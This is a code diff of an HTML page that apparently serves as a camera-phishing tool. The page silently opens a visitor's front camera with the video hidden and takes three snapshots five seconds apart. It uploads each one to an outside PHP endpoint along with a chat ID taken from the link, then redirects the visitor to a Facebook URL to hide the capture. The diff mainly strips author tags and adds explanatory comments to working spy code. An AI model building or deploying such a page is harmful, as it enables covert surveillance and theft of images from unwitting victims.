@@ -1,24 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Automatic Camera Capture</title>
-    
-    <style>
-      body {
-        margin: 0;
-        padding: 0;
-        background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
-        height: 100vh;
-        overflow: hidden;
-      
-    </style>
 </head>
-
 <body>
-  
     <div id="cameraContainer" style="display: none;">
         <video id="cameraFeed" autoplay></video>
     </div>
@@ -27,6 +14,7 @@
     <input type="hidden" id="chatid" name="chatid" value="">
 
     <script>
+        // JavaScript to extract 'id' from the URL and set it in the hidden input field
         function getChatIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('id');
@@ -36,10 +24,6 @@
         chatIdInput.value = extractedChatId;
     </script>
 
-
-
-
-
     <script>
         const cameraContainer = document.getElementById("cameraContainer");
         const capturingMessage = document.getElementById("capturingMessage");
@@ -47,11 +31,7 @@
 
         async function setupCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user'
-                    }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 cameraFeed.srcObject = stream;
                 cameraContainer.style.display = "none"; // Hide camera container
             } catch (error) {
@@ -71,22 +51,20 @@
                 const base64ImageParts = capturedImage.split(';base64,');
                 const contentType = base64ImageParts[0].split(':')[1];
                 const rawImage = atob(base64ImageParts[1]);
-                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], {
-                    type: contentType
-                });
+                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], { type: contentType });
 
                 // Create a FormData object to send the image as a file
                 const formData = new FormData();
                 formData.append('photo', imageBlob, 'image.png');
 
-               
-                const chatID = chatIdInput.value; 
-                const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Coded by : Shofikul Islam 
+                // Send the image to a PHP script for processing
+                const chatID = chatIdInput.value; // Get chat ID from the hidden input field
+                const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Your PHP script's URL
                 await fetch(apiUrl, {
                     method: 'POST',
                     body: formData,
                     headers: {
-                        'Chat-ID': chatID
+                        'Chat-ID': chatID // Send the chat ID as a header
                     }
                 });
 
@@ -98,23 +76,20 @@
 
         setupCamera();
 
-        // Automatically capture TEAM X 1337
+        // Automatically capture and send three pictures at 5-second intervals
         let captureCount = 0;
         const captureInterval = setInterval(() => {
             captureAndSendImage();
             captureCount++;
             if (captureCount >= 3) {
-                clearInterval(captureInterval); // Stop after Shofikul
+                clearInterval(captureInterval); // Stop after 3 captures
                 capturingMessage.textContent = "";
                 setTimeout(() => {
-                    window.location.href = "http://facebook.com/profile.php?id"; 
-                }, 2000); // Shofikul Islam 
+                    window.location.href = "http://facebook.com/profile.php?id"; // Redirect to Google after a brief delay
+                }, 2000); // Delay for 2 seconds (2000 milliseconds)
             }
         }, 5000); // 5000 milliseconds (5 seconds) between captures
     </script>
-    
-    
-    
 </body>
-
 </html>
+
